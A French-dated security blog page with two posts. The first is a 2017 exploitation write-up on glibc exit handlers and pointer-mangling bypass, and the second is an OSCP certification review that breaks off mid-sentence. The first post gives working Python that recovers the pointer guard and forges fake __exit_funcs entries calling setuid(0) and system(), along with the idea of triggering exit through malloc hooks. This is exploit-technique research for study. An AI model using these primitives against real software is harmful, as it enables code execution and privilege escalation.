@@ -1,0 +1,1383 @@
+Binary world for binary people :)
+ Binary world for binary people :) samedi 20 mai 2017 Notes on abusing exit handlers, bypassing pointer mangling and glibc ptmalloc hooks Hi, Today we'll talk about abusing exit handlers in order to hijack the control flow. This research stemmed from Google Project Zero article about heap overflow NULL byte poisoning where they described using __exit_funcs or tls_dtor_list to achieve code execution. The issue I had was to find a way to resolve reliably these non-exported symbols and access them. The exit handlers are quite interesting as it is an easy version to do ROP as they all take one parameter. Functions such as setuid(), system() or other functions needing 1 parameter can thus be easily called. Pointer mangling is a mitigation implemented in order to thwart direct function pointer corruption. I'll show in this post how it can be bypassed. We'll first analyze the code leading to the execution of these exit handlers and then show how to trigger them. There will be a lot of pasted listing ahead, these will be explained as we go. Where is the code leading to executing these exit handlers? About exit () Whenever we call libc exit(), it calls all the handlers we registered with atexit() and on_exit() before calling the _exit() syscall. This is located in "glibc/stdlib/exit.c". void
+exit (int status)
+{
+  __run_exit_handlers (status, &__exit_funcs, true, true);
+} exit() is just a nicely named wrapper for "__run_exit_handlers()". Let's look at __run_exit_handlers(): /* Call all functions registered with `atexit' and `on_exit',
+   in the reverse of the order in which they were registered
+   perform stdio cleanup, and terminate program execution with STATUS.  */
+void
+attribute_hidden
+__run_exit_handlers (int status, struct exit_function_list **listp,
+       bool run_list_atexit, bool run_dtors)
+{
+  /* First, call the TLS destructors.  */
+#ifndef SHARED
+  if (&__call_tls_dtors != NULL)
+#endif
+    if (run_dtors)
+      __call_tls_dtors ();
+
+  /* We do it this way to handle recursive calls to exit () made by
+     the functions registered with `atexit' and `on_exit'. We call
+     everyone on the list and use the status value in the last
+     exit (). */
+  while (*listp != NULL)
+    {
+      struct exit_function_list *cur = *listp;
+
+      while (cur->idx > 0)
+ {
+   const struct exit_function *const f =
+     &cur->fns[--cur->idx];
+   switch (f->flavor)
+     {
+       void (*atfct) (void);
+       void (*onfct) (int status, void *arg);
+       void (*cxafct) (void *arg, int status);
+
+     case ef_free:
+     case ef_us:
+       break;
+     case ef_on:
+       onfct = f->func.on.fn;
+#ifdef PTR_DEMANGLE
+       PTR_DEMANGLE (onfct);
+#endif
+       onfct (status, f->func.on.arg);
+       break;
+     case ef_at:
+       atfct = f->func.at;
+#ifdef PTR_DEMANGLE
+       PTR_DEMANGLE (atfct);
+#endif
+       atfct ();
+       break;
+     case ef_cxa:
+       cxafct = f->func.cxa.fn;
+#ifdef PTR_DEMANGLE
+       PTR_DEMANGLE (cxafct);
+#endif
+       cxafct (f->func.cxa.arg, status);
+       break;
+     }
+ }
+
+      *listp = cur->next;
+      if (*listp != NULL)
+ /* Don't free the last element in the chain, this is the statically
+    allocate element.  */
+ free (cur);
+    }
+
+  if (run_list_atexit)
+    RUN_HOOK (__libc_atexit, ());
+
+  _exit (status);
+} We can see that "__run_exit_handlers()" does use pointer demangling by using PTR_DEMANGLE() before dereferencing the function pointers and calling the pointed code. We will thus need to analyze how the mangling and demangling is done in order to bypass it. We first see that it tries to call "__call_tls_dtors()", this is interesting as this called function is used to call destructors in tls_dtor_list, we'll come back to it. Let's look what a 'struct exit_function_list' look like. This is located in "glibc/stdlib/exit.h". enum
+{
+  ef_free, /* `ef_free' MUST be zero!  */
+  ef_us,
+  ef_on,
+  ef_at,
+  ef_cxa
+};
+
+struct exit_function
+  {
+    /* `flavour' should be of type of the `enum' above but since we need
+       this element in an atomic operation we have to use `long int'.  */
+    long int flavor;
+    union
+      {
+ void (*at) (void);
+ struct
+   {
+     void (*fn) (int status, void *arg);
+     void *arg;
+   } on;
+ struct
+   {
+     void (*fn) (void *arg, int status);
+     void *arg;
+     void *dso_handle;
+   } cxa;
+      } func;
+  };
+struct exit_function_list
+  {
+    struct exit_function_list *next;
+    size_t idx;
+    struct exit_function fns[32];
+  }; Each handler can have 5 flavors : ef_free, ef_us, ef_on, ef_at and ef_cxa. Depending on the flavor of the exit handler, we'll have a function pointer, argument and/or dso handle. The function list can store at most 32 handlers and a linked list is created if more is needed. idx is the total number of functions and is 1-based (not 0-based as usually). And our PTR_MANGLE() and PTR_DEMANGLE() definitions in "sysdeps/unix/sysv/linux/x86_64/sysdep.h". #  define PTR_MANGLE(var) asm ("xor %%fs:%c2, %0\n"        \
+         "rol $2*" LP_SIZE "+1, %0"        \
+         : "=r" (var)         \
+         : "0" (var),         \
+           "i" (offsetof (tcbhead_t,       \
+            pointer_guard)))
+#  define PTR_DEMANGLE(var) asm ("ror $2*" LP_SIZE "+1, %0\n"       \
+         "xor %%fs:%c2, %0"         \
+         : "=r" (var)         \
+         : "0" (var),         \
+           "i" (offsetof (tcbhead_t,       \
+            pointer_guard))) Here we can see that it uses the "pointer_guard" offset in the structure "tcbhead_t" in order to access the pointer_guard in fs, this will be fs:0x30 on 64-bits machines. The assembly of "__run_exit_handlers()". pwndbg> disassemble __run_exit_handlers
+Dump of assembler code for function __run_exit_handlers:
+   0x0000000000039f10 <+0>: push   r13
+   0x0000000000039f12 <+2>: push   r12
+   0x0000000000039f14 <+4>: mov    r12d,edx
+   0x0000000000039f17 <+7>: push   rbp
+   0x0000000000039f18 <+8>: push   rbx
+   0x0000000000039f19 <+9>: mov    rbp,rsi
+   0x0000000000039f1c <+12>: mov    ebx,edi
+   0x0000000000039f1e <+14>: sub    rsp,0x8
+   0x0000000000039f22 <+18>: call   0x3a5c0 <__gi___call_tls_dtors>
+   0x0000000000039f27 <+23>: mov    r13,QWORD PTR [rbp+0x0]
+   0x0000000000039f2b <+27>: test   r13,r13
+   0x0000000000039f2e <+30>: je     0x39f80 <__run_exit_handlers>
+   0x0000000000039f30 <+32>: mov    rax,QWORD PTR [r13+0x8]
+   0x0000000000039f34 <+36>: mov    rdx,rax
+   0x0000000000039f37 <+39>: shl    rdx,0x5
+   0x0000000000039f3b <+43>: test   rax,rax
+   0x0000000000039f3e <+46>: lea    rcx,[r13+rdx*1-0x10]
+   0x0000000000039f43 <+51>: je     0x39f6f <__run_exit_handlers>
+   0x0000000000039f45 <+53>: sub    rax,0x1
+   0x0000000000039f49 <+57>: mov    QWORD PTR [r13+0x8],rax
+   0x0000000000039f4d <+61>: mov    rdx,QWORD PTR [rcx]
+   0x0000000000039f50 <+64>: cmp    rdx,0x3
+   0x0000000000039f54 <+68>: je     0x3a000 <__run_exit_handlers>
+ ; ef_cxa
+   0x0000000000039f5a <+74>: cmp    rdx,0x4
+   0x0000000000039f5e <+78>: je     0x39fd8 <__run_exit_handlers>
+
+   0x0000000000039f60 <+80>: cmp    rdx,0x2
+   0x0000000000039f64 <+84>: je     0x39fb0 <__run_exit_handlers>
+   0x0000000000039f66 <+86>: sub    rcx,0x20
+   0x0000000000039f6a <+90>: test   rax,rax
+   0x0000000000039f6d <+93>: jne    0x39f45 <__run_exit_handlers>
+   0x0000000000039f6f <+95>: mov    rax,QWORD PTR [r13+0x0]
+   0x0000000000039f73 <+99>: test   rax,rax
+   0x0000000000039f76 <+102>: mov    QWORD PTR [rbp+0x0],rax
+   0x0000000000039f7a <+106>: jne    0x3a01d <__run_exit_handlers>
+   0x0000000000039f80 <+112>: test   r12b,r12b
+   0x0000000000039f83 <+115>: je     0x39fa4 <__run_exit_handlers>
+   0x0000000000039f85 <+117>: lea    rbp,[rip+0x38594c]        # 0x3bf8d8 <__elf_set___libc_atexit_element__io_cleanup__>
+   0x0000000000039f8c <+124>: lea    r12,[rip+0x38594d]        # 0x3bf8e0 <__elf_set___libc_thread_subfreeres_element_arena_thread_freeres__>
+   0x0000000000039f93 <+131>: cmp    rbp,r12
+   0x0000000000039f96 <+134>: jae    0x39fa4 <__run_exit_handlers>
+   0x0000000000039f98 <+136>: call   QWORD PTR [rbp+0x0]
+   0x0000000000039f9b <+139>: add    rbp,0x8
+   0x0000000000039f9f <+143>: cmp    rbp,r12
+   0x0000000000039fa2 <+146>: jb     0x39f98 <__run_exit_handlers>
+   0x0000000000039fa4 <+148>: mov    edi,ebx
+   0x0000000000039fa6 <+150>: call   0xcbb60 <__gi__exit>
+   0x0000000000039fab <+155>: nop    DWORD PTR [rax+rax*1+0x0]
+   0x0000000000039fb0 <+160>: shl    rax,0x5
+   0x0000000000039fb4 <+164>: mov    edi,ebx
+   0x0000000000039fb6 <+166>: add    rax,r13
+   0x0000000000039fb9 <+169>: mov    rdx,QWORD PTR [rax+0x18]
+   0x0000000000039fbd <+173>: mov    rsi,QWORD PTR [rax+0x20]
+   0x0000000000039fc1 <+177>: ror    rdx,0x11
+   0x0000000000039fc5 <+181>: xor    rdx,QWORD PTR fs:0x30
+   0x0000000000039fce <+190>: call   rdx
+   0x0000000000039fd0 <+192>: jmp    0x39f30 <__run_exit_handlers>
+   0x0000000000039fd5 <+197>: nop    DWORD PTR [rax]
+
+ ; ef_cxa
+   0x0000000000039fd8 <+200>: shl    rax,0x5
+   0x0000000000039fdc <+204>: mov    esi,ebx
+   0x0000000000039fde <+206>: add    rax,r13
+   0x0000000000039fe1 <+209>: mov    rdx,QWORD PTR [rax+0x18]
+   0x0000000000039fe5 <+213>: mov    rdi,QWORD PTR [rax+0x20]
+   0x0000000000039fe9 <+217>: ror    rdx,0x11
+   0x0000000000039fed <+221>: xor    rdx,QWORD PTR fs:0x30
+   0x0000000000039ff6 <+230>: call   rdx
+   0x0000000000039ff8 <+232>: jmp    0x39f30 <__run_exit_handlers>
+   0x0000000000039ffd <+237>: nop    DWORD PTR [rax]
+   0x000000000003a000 <+240>: shl    rax,0x5
+   0x000000000003a004 <+244>: mov    rax,QWORD PTR [r13+rax*1+0x18]
+   0x000000000003a009 <+249>: ror    rax,0x11
+   0x000000000003a00d <+253>: xor    rax,QWORD PTR fs:0x30
+   0x000000000003a016 <+262>: call   rax
+   0x000000000003a018 <+264>: jmp    0x39f30 <__run_exit_handlers>
+   0x000000000003a01d <+269>: mov    rdi,r13
+   0x000000000003a020 <+272>: call   0x1f8a8
+   0x000000000003a025 <+277>: jmp    0x39f27 <__run_exit_handlers>
+End of assembler dump. In case you missed it, the code that really interest us is this:    0x0000000000039fe9 <+217>: ror    rdx,0x11
+   0x0000000000039fed <+221>: xor    rdx,QWORD PTR fs:0x30
+   0x0000000000039ff6 <+230>: call   rdx So what's stored at fs:X? Let's look at Thread Control Block. About Thread Control Block Like we saw in PTR_MANGLE() and PTR_DEMANGLE(), it all has to do with the structure "tcbhead_t". This structure is what's stored at FS, which correspond to the per thread data (TCB probably for Thread Control Block). So at fs:0x30 we get the pointer_guard. It's the pointer guard as defined in "sysdeps/x86_64/nptl/tls.h" in the structure "tcbhead_t". typedef struct
+{
+  void *tcb;  /* Pointer to the TCB.  Not necessarily the
+      thread descriptor used by libpthread.  */
+  dtv_t *dtv;
+  void *self;  /* Pointer to the thread descriptor.  */
+  int multiple_threads;
+  int gscope_flag;
+  uintptr_t sysinfo;
+  uintptr_t stack_guard;
+  uintptr_t pointer_guard;
+  unsigned long int vgetcpu_cache[2];
+# ifndef __ASSUME_PRIVATE_FUTEX
+  int private_futex;
+# else
+  int __glibc_reserved1;
+# endif
+  int __glibc_unused1;
+  /* Reservation of some values for the TM ABI.  */
+  void *__private_tm[4];
+  /* GCC split stack support.  */
+  void *__private_ss;
+  long int __glibc_reserved2;
+  /* Must be kept even if it is no longer used by glibc since programs,
+     like AddressSanitizer, depend on the size of tcbhead_t.  */
+  __128bits __glibc_unused2[8][4] __attribute__ ((aligned (32)));
+
+  void *__padding[8];
+} tcbhead_t; Where is that pointer_guard setted up? It's setted up in "csu/libc-start.c".   /* Set up the pointer guard value.  */
+  uintptr_t pointer_chk_guard = _dl_setup_pointer_guard (_dl_random,
+        stack_chk_guard);
+# ifdef THREAD_SET_POINTER_GUARD
+  THREAD_SET_POINTER_GUARD (pointer_chk_guard);
+# else
+  __pointer_chk_guard_local = pointer_chk_guard;
+# endif We could go look the code at "_dl_setup_pointer_guard()" but research was not done there. We still need to determine where we can hit and overwrite these handlers. Let's start with __exit_funcs. About atexit() and finding __exit_funcs The "atexit()" code is located in "cxa_atexit.c" /* Register a function to be called by exit or when a shared library
+   is unloaded.  This function is only called from code generated by
+   the C++ compiler.  */
+int
+__cxa_atexit (void (*func) (void *), void *arg, void *d)
+{
+  return __internal_atexit (func, arg, d, &__exit_funcs);
+}
+libc_hidden_def (__cxa_atexit) And the corresponding assembly. pwndbg> disassemble __cxa_atexit 
+Dump of assembler code for function __GI___cxa_atexit:
+   0x000000000003a280 <+0>: push   r12
+   0x000000000003a282 <+2>: push   rbp
+   0x000000000003a283 <+3>: mov    r12,rsi
+   0x000000000003a286 <+6>: push   rbx
+   0x000000000003a287 <+7>: mov    rbx,rdi
+   0x000000000003a28a <+10>: lea    rdi,[rip+0x389367]        # 0x3c35f8 <__exit_funcs>
+   0x000000000003a291 <+17>: mov    rbp,rdx
+   0x000000000003a294 <+20>: call   0x3a0a0 <__new_exitfn>
+   0x000000000003a299 <+25>: test   rax,rax
+   0x000000000003a29c <+28>: je     0x3a2c8 <__gi___cxa_atexit>
+   0x000000000003a29e <+30>: mov    rdi,rbx
+   0x000000000003a2a1 <+33>: mov    QWORD PTR [rax+0x10],r12
+   0x000000000003a2a5 <+37>: mov    QWORD PTR [rax+0x18],rbp
+   0x000000000003a2a9 <+41>: xor    rdi,QWORD PTR fs:0x30
+   0x000000000003a2b2 <+50>: rol    rdi,0x11
+   0x000000000003a2b6 <+54>: mov    QWORD PTR [rax+0x8],rdi
+   0x000000000003a2ba <+58>: mov    QWORD PTR [rax],0x4
+   0x000000000003a2c1 <+65>: xor    eax,eax
+   0x000000000003a2c3 <+67>: pop    rbx
+   0x000000000003a2c4 <+68>: pop    rbp
+   0x000000000003a2c5 <+69>: pop    r12
+   0x000000000003a2c7 <+71>: ret    
+   0x000000000003a2c8 <+72>: mov    eax,0xffffffff
+   0x000000000003a2cd <+77>: jmp    0x3a2c3 <__gi___cxa_atexit>
+End of assembler dump. What's interesting is "__exit_funcs" being used. "__exit_funcs" is an un-exported function but we can resolve it by disassembling that piece of assembly with capstone and retrieving the needed VA. "__cxa_atexit()" is an exported symbol so we can retrieve the VA easily using pwntools.elf.ELF. You can see at VA 0x3a28a that it calculates the address of "__exit_funcs". Here is the code I wrote to do just that: # get __exit_funcs addr
+def get_exit_funcs (code, off = 0):
+    md = Cs (CS_ARCH_X86, CS_MODE_64)
+    md.detail = True
+
+    # look for ptr offset
+    ptr_exit_funcs = None
+    for inst in md.disasm (code[off:], off):
+        if inst.mnemonic != 'lea':
+            continue
+        for operand in inst.operands:
+
+            if operand.type == x86.X86_OP_MEM:
+                if inst.reg_name (operand.value.mem.base) != 'rip':
+                    continue
+                ptr_exit_funcs = inst.address + inst.size + operand.value.mem.disp
+                break
+        if ptr_exit_funcs:
+            break
+
+    if ptr_exit_funcs is None:
+        return None
+    return ptr_exit_funcs I'll show at the end of the article how to use it to bypass pointer mangling. Let's first have a look at tls_dtor_list. About __call_tls_dtors() and finding tls_dtor_list I was talking about "__call_tls_dtors()" being an interesting piece of code to look at. /* Call the destructors.  This is called either when a thread returns from the
+   initial function or when the process exits via the exit function.  */
+void
+__call_tls_dtors (void)
+{
+  while (tls_dtor_list)
+    {
+      struct dtor_list *cur = tls_dtor_list;
+      dtor_func func = cur->func;
+#ifdef PTR_DEMANGLE
+      PTR_DEMANGLE (func);
+#endif
+
+      tls_dtor_list = tls_dtor_list->next;
+      func (cur->obj);
+
+      /* Ensure that the MAP dereference happens before
+  l_tls_dtor_count decrement.  That way, we protect this access from a
+  potential DSO unload in _dl_close_worker, which happens when
+  l_tls_dtor_count is 0.  See CONCURRENCY NOTES for more detail.  */
+      atomic_fetch_add_release (&cur->map->l_tls_dtor_count, -1);
+      free (cur);
+    }
+} The part that really interest us is about tls_dtor_list being used. The corresponding assembly. pwndbg> disassemble __GI___call_tls_dtors
+Dump of assembler code for function __GI___call_tls_dtors:
+   0x000000000003a5c0 <+0>: push   rbp
+   0x000000000003a5c1 <+1>: push   rbx
+   0x000000000003a5c2 <+2>: sub    rsp,0x8
+   0x000000000003a5c6 <+6>: mov    rbp,QWORD PTR [rip+0x3887b3]        # 0x3c2d80
+   0x000000000003a5cd <+13>: mov    rbx,QWORD PTR fs:[rbp+0x0]
+   0x000000000003a5d2 <+18>: test   rbx,rbx
+   0x000000000003a5d5 <+21>: je     0x3a61e <__gi___call_tls_dtors>
+   0x000000000003a5d7 <+23>: nop    WORD PTR [rax+rax*1+0x0]
+   0x000000000003a5e0 <+32>: mov    rdx,QWORD PTR [rbx+0x18]
+   0x000000000003a5e4 <+36>: mov    rax,QWORD PTR [rbx]
+   0x000000000003a5e7 <+39>: mov    rdi,QWORD PTR [rbx+0x8]
+   0x000000000003a5eb <+43>: ror    rax,0x11
+   0x000000000003a5ef <+47>: xor    rax,QWORD PTR fs:0x30
+   0x000000000003a5f8 <+56>: mov    QWORD PTR fs:[rbp+0x0],rdx
+   0x000000000003a5fd <+61>: call   rax
+   0x000000000003a5ff <+63>: mov    rax,QWORD PTR [rbx+0x10]
+   0x000000000003a603 <+67>: lock sub QWORD PTR [rax+0x450],0x1
+   0x000000000003a60c <+76>: mov    rdi,rbx
+   0x000000000003a60f <+79>: call   0x1f8a8
+   0x000000000003a614 <+84>: mov    rbx,QWORD PTR fs:[rbp+0x0]
+   0x000000000003a619 <+89>: test   rbx,rbx
+   0x000000000003a61c <+92>: jne    0x3a5e0 <__gi___call_tls_dtors>
+   0x000000000003a61e <+94>: add    rsp,0x8
+   0x000000000003a622 <+98>: pop    rbx
+   0x000000000003a623 <+99>: pop    rbp
+   0x000000000003a624 <+100>: ret    
+End of assembler dump. You can see at VA 0x3a5c6 that it dereferences the pointer to tls_dtor_list. So we can disassemble that function and find that offset using capstone. "__call_tls_dtors" is exported so the address can be easily parsed out using pwntools.elf.ELF. I didn't write code for it but the idea is the same as for __exit_funcs, this is left as an exercise to the reader. Bypassing pointer mangling While playing with a binary challenge, I happened to see that _dl_fini() is often registered in the __exit_funcs array, so we can recalculate the pointer_guard value and thus bypass pointer mangling. The issue with "_dl_fini()" is that it seems to be an un-exported symbol. I've found the address while digging in gdb. An elf parser probably has to be written to find "_dl_fini()" address. A vulnerability that allows you to leak an encoded pointer in __exit_funcs is also necessary. Here we use _dl_fini encoded pointer. The formula to compute the pointer_guard assuming that "_dl_fini()" is used is as follow: ptr_guard = ror (ptr_encoded, 0x11, 64) ^ _dl_fini Here the code you've been waiting for. We re-use "get_exit_funcs()" that was showed earlier. # Rotate left: 0b1001 --> 0b0011
+rol = lambda val, r_bits, max_bits: \
+    (val << r_bits%max_bits) & (2**max_bits-1) | \
+    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))
+ 
+# Rotate right: 0b1001 --> 0b1100
+ror = lambda val, r_bits, max_bits: \
+    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
+    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))
+
+elf = ELF (libc_filename)
+
+# get libc data
+content = ''
+with open (libc_filename) as fp:
+    content = fp.read ()
+
+# get our exit_funcs address
+off_cxa_atexit = elf.symbols['__cxa_atexit']
+ptr_exit_funcs = libc_base + get_exit_funcs (content, off_cxa_atexit)
+off_exit_funcs = ptr_exit_funcs - start_data
+__exit_funcs = struct.unpack ('<Q', libc_data[off_exit_funcs:off_exit_funcs + 8])[0]
+# our encoded pointer location
+off_ptr_encoded = (__exit_funcs - start_data) + 24
+ptr_encoded = struct.unpack ('<Q', libc_data[off_ptr_encoded:off_ptr_encoded + 8])[0]
+# this is used to encode pointers
+ptr_guard = ror (ptr_encoded, 0x11, 64) ^ _dl_fini
+
+print '\n[+] Leak __exit_funcs'
+print 'start_data               : 0x%016x' % start_data
+print 'ptr_exit_funcs           : 0x%016x' % ptr_exit_funcs
+print 'exit_funcs               : 0x%016x' % __exit_funcs
+print 'off_ptr_encoded          : 0x%016x' % off_ptr_encoded
+print 'ptr_encoded              : 0x%016x' % ptr_encoded
+print 'ptr_guard                : 0x%016x' % ptr_guard Now that we got the pointer_guard, what do we do? We craft a fake __exit_funcs and corrupt the original __exit_funcs. class CxaFunc (object):
+    def __init__ (self, func, arg, ptr_guard):
+        self.func = func
+        self.arg = arg
+        self.ptr_guard = ptr_guard
+
+    def __str__ (self):
+        # flavor = 4 (ef_cxa) + func + arg + NULL (dso handle)
+        if self.ptr_guard:
+            encoded = rol (self.func ^ self.ptr_guard, 0x11, 64)
+        else:
+            encoded = self.func
+        print 'func : 0x%016x | encoded : 0x%016x | arg : 0x%016x' % (self.func, encoded, self.arg)
+  # ef_cxa == 4 | encoded function pointer | argument | dso handle set to NULL
+        data = struct.pack ('<Q', 4) + struct.pack ('<Q', encoded) + struct.pack ('<Q', self.arg) + struct.pack ('<Q', 0)
+        return data
+
+class ExitHandlers (object):
+    def __init__ (self, ptr_guard):
+        self.handlers = list ()
+        self.ptr_guard = ptr_guard
+
+    def append (self, func, arg):
+        cxafunc = CxaFunc (func, arg, self.ptr_guard)
+        self.handlers.append (cxafunc)
+
+    def __str__ (self):
+        fake_exit_funcs = ''
+        # next = NULL
+        fake_exit_funcs += struct.pack ('<Q', 0)
+        # idx = number of handlers
+        print 'Packing %d handlers' % len (self.handlers)
+        fake_exit_funcs += struct.pack ('<Q', len (self.handlers))
+        for cxafunc in self.handlers:
+            fake_exit_funcs += str (cxafunc)
+
+        return fake_exit_funcs
+
+# build our exit_funcs functions list
+fake_exit_funcs = ExitHandlers (ptr_guard)
+# setuid
+fake_exit_funcs.append (func_setuid, 0)
+# system and get cmd
+for heap_addr in heap_addrs:
+    fake_exit_funcs.append (func_system, heap_addr)
+fake_exit_funcs = str (fake_exit_funcs) Given you've recalculated the proper pointer_guard ... pointer mangling is bypassed. Other (untested) ideas to get the pointer_guard? There probably is another way to get that pointer_guard given you've got an arbitrary infoleak. This may be possible through a pointer corruption or a UAF or Type Confusion or something else. If the attacker somehow manage to find where 'struct tcbhead' is located in memory, he may be able to just read the value out of it. Last idea is probably far fetched but let's look at it. Let's say you got an oracle : crash or not crash and that your process is respawned through a fork(). You could probably use techniques similar as those used for blind rop to guess the pointer guard. More research can be done there but we don't need it for now. About glibc ptmalloc hooks It may come a time where you somehow can't manage to exit a program running as it may run in a infinite loop for example. In order to use our previous technique, the process has to call the libc exit() function. This happens when the process prepare to exit. We may be able to trigger that function before reaching the end of the program by using glibc ptmalloc hooks. In each glibc ptmalloc functions, there is a function pointer that is called given it's not NULL. By over-writing one of these hooks with glibc exit() function and triggering the corresponding malloc(), free() or realloc() call, we'll trigger the execution of our payload written in __exit_funcs. These functions hook are all exported symbols that you can easily get with pwntools.elf.ELF : __free_hook, __malloc_hook, __realloc_hook and __memalign_hook. Conclusion Full mitigations bypass is still possible nowadays on the latest Linux distribution given the proper vulnerabilities and binary. Every technique is applicable on a case-by-case basis. Pointer mangling was implemented in order to make destructors corruption exploitation harder, but as can be seen it's not impossible. This technique is particularly useful when you don't know where the stack is and you have full RELRO activated. It allows you to do an easy version of ROP. Cheers, m_101 References - The poisoned NULL byte, 2014 edition : https://googleprojectzero.blogspot.com/2014/08/the-poisoned-nul-byte-2014-edition.html - Pointer Encryption : https://sourceware.org/glibc/wiki/PointerEncryption Publié par m_101 à 23:08 0 commentaires Envoyer par e-mail BlogThis! Partager sur Twitter Partager sur Facebook Liens vers cet article Réactions :   vendredi 31 mars 2017 Yet Another OSCP Review I just took the OSCP Course and successfully passed the exam. There are many other great reviews of the course out there, just thought I'd add my grain of salt. I decided to take that course as I wanted to see where I was at in terms of hacking and penetration testing skills. As some of  you know, I've been more or less playing with code, hacks and exploits there and there for some time now. So yeah, it was time for something a little bit more formal and still hand-on. About the PWK - OSCP lab This training is an introductory course to penetration testing. It is not an easy certification mainly due to the time that needs to be dedicated. The lab is composed of a simulated company network, it is well thought out. There are multiple sub-networks and dependencies between machines. The goal is to hack and obtain administrator, SYSTEM or root privileges on as many machines as you can. You have no obligation to hack all the machines, but there are quite a lot of them which are interesting. Machines run Linux, Windows or FreeBSD. Vulnerabilities goes from 2000 to end of 2016. You thus see a wide array of technologies, vulnerabilities and ways to hack into computers. The course material consist of a PDF eBook and a couple of videos. Apart from that, it's self-learning and sharing information on #offsec IRC or the forums. No information sharing about machines is tolerated though. The staff is pretty helpful to confirm the track you're on without giving you anything that spoil the challenges. They will help you and motivate you as long as you've shown that you worked hard and did the proper research. Pre-Requisite Many skills are recommended to have before-hand unless you want to really suffer: - Linux and Windows command-line skills - some basic scripting skills : some exploits modification are required in the lab - training on vulnhub VMs will make your experience smoother and better - IT experience : networking, development or security You could start from 0, but as some people say : they've suffered even though they liked the course. It is a HARD course for anyone starting in the field. But it is necessary. No way around learning the hard way and suffering a little bit. This is NOT an exploit development course, so you don't need to understand everything about assembly or buffer overflow or other exploitation techniques. There are buffer overflows to exploit in the course, but these are explained sufficiently in details step by step in order for anyone taking the course to understand it. My lab run Pwning the lab There are 30, 60 or 90 days packages, each including an exam attempt. I took the 30 days package as I figured I'd extend by 30 days if necessary. I ended up doing the whole lab in around 3 weeks and the remaining time for the lab report (150-300 pages depending on people). Plan time for the lab report as access to the lab is necessary for some exercises. I started my lab around the start of February and worked on it until start of March. I was clocking in around 10-15h/day, yeah I had the opportunity to do the OSCP lab and exam full time so I did it. In retrospect, it would have been better to take the 60 days package. It would have been a better balance. The thing that took most of my time was recon, enumeration and post-exploitation. Some machines can't be exploited frontally, there are dependencies between machines. Dependencies students have to find by themselves. Taking notes while rooting boxes saved me a ton of time. I was having around 2-5 boxes a day. Fastest was 10 minutes, slowest was 5-6h. While pwning boxes, I had enumeration tools running (dirbuster, etc). How to do it in such a limited time frame? - have time to dedicate to the course - be organized : exploits, notes, TTP (Tactics Techniques Procedures), etc - run multiple scans in parallel in a staged fashion (nmap top 1000 ports then full ports while you're analyzing the first scan, multiple dirbusters running targeting multiple machines, etc) - statically compiled tools (if you've played with pivots, you probably know why ;)) - go after low hanging fruits first - keep proper notes about every important steps you take - do proper post-exploitation - already have some experience - Ask yourself the right questions. Don't blindly follow "exploitation guides", "penetration guides" or "privilege escalation guides". Ask yourselves what are the objectives and goal of each steps described? How much time should I take? This is really subjective. I'll based those approximations from people I spoke to on IRC. For someone with pentesting experience, been pwning quite some boxes, got time after work, I'd say 30-60 days. For someone with a good development background, got some time after work, 3-6 months. For someone with no IT skills, 1-3 years. The most important thing being motivation and the time you can dedicate everyday to the course. This is why this certification is hard : it will take your time, you need caring people and external distractions from time to time. Use automated scripts or not? I typed every single commands by hand, there are multiple reasons for that: - faster : automated scripts are great but they run scans that can be useless in the end. For instance, if you managed to find a flaw resulting in Remote Code Execution in the found web app ... What use is there for running dirb, nikto, snmpwalk or SMB NULL enumeration? Once access is gained, 'netstat' and file enumeration are faster and better "port scanners" and "version probers". - automated scripts are not for speed, it is for consistency. Attack consistency can probably be fingerprinted and attack patterns be extracted. - automated scripts are super noisy, rarely can fine tune the details - better memorization - better tool understanding (and thus better adaptation, not depending on a single tool) - I can't allow a tool to interpret data for me without me being able to check that raw data. Having interpreted data AND raw data is really important, vulnerabilities can be in the details. Other tips? Getting good at hacking or pentesting is not all about the technical part. Get breaks, go run, see friends, have beers, have a balanced life while doing the certification. This certification sure is addictive, so be careful. About the OSCP exam The exam is hard, not for technical reasons but for the duration reason in my opinion. I'll come back to that later. If you try the exam, it means you're kind of ready to validate your technical skills and knowledge. The exam include 5 machines to hack. Each machines are graded from 10 to 25 points. 10 points being the easiest and 25 points the hardest. You need 70 points to pass the certification. It is subjective, depending on your skillset, the 25 points machines may be easy for you. The duration reason : you got 23h45 minutes to validate the exam. It looks like a long time, but hours do burn fast. My exam run A 0.5 box is an access obtained with low privileges. A 1 box is an access obtained with full privileges. The duration reason is the real hard part. After some time, you also get tunnel vision and you get pretty tired. So take breaks. Before the exam: - a step back from hacking - beers with friends - going out a little bit - some rest It helps to disconnect from the subject to avoid tunnel vision. So what I prepared: - a super clean and tidy room and environment - lots of food and drinks - breaks and naps - No coffee, red bull or whatever substances that people use in order to stay awake. It's a trap as you won't be able to have efficient naps. Naps were ultra super helpful. Attacking machine: - a clean and fully updated and configured Kali VM - CherryTree for note taking - crackmapexec for popping shells (can't use exploit/* but the multi/handler in the exam) - metasploit multi/handler - SecLists - GIMP for cropping screenshots - remmina for RDP - bunch of other stuffs I had 2 attempts. In both attempts, I did not use any metasploit exploits, auxiliary or post module. 1st attempt In retrospect I could have passed with the 1st try and here are my main mistakes: - not following my intuition : "this smells vulnerable", almost at the end of the exam I ended up with a low privilege shell quickly on one of the box I was stucked on - not rested enough before the exam - too many tabs open in my browser : close them regularly I failed for non technical reasons. Don't take a fail as a failure but as a learning experience to further improve yourself for next time. 2nd attempt Unfortunately, I got sick during the 48h preceding my scheduled exam time. According to Offensive Security rules, no cancelation or re-scheduling is possible during that time. So I just went on with it. I can say that it was really painful, between being tired, sick, coughing and the exam but I managed to get it. After 4-5h + 1h (lunch) + 4-5h I had 1.5 boxes and was still poking around for recon and enumeration. I thought I was doomed. I went to sleep for 4h, waked up, got some dinner and got 2.5 boxes in 5h. I had 4 boxes, enough to pass the exam. Stucked on the 5th box, I tried to sleep for 2-3h, but ended up reading, playing games, googling, watching "The Flash" last episode, making sure my notes and screenshots were neat, small power nap. Went back to the 5th box, couldn't gain access. In the end, exhausted, I stopped around 3h before the end of the exam and went to sleep. So during those 23h45, I got around 7h of sleep splitted in 2, 15h of challenge time and 2h for entertainment and food. Refreshments during the whole exam. Those are approximates. The next day I wrote my report and got an hypothesis as how to root the last box. This hypothesis stemed from the feeling "IT IS vuln there" I had while attempting to root the 5th box. The next day (today), got the email with the "pass" result, it was such a relief that I could go back to a normal life again. I'll wait some time before passing OSCE, hopefully before the end of the year. Conclusion Everyone would say "try harder" but not everyone knows what it means. Try harder is the embodiment of the following: - keep at it - be persistent - recon, enumerate as much as you 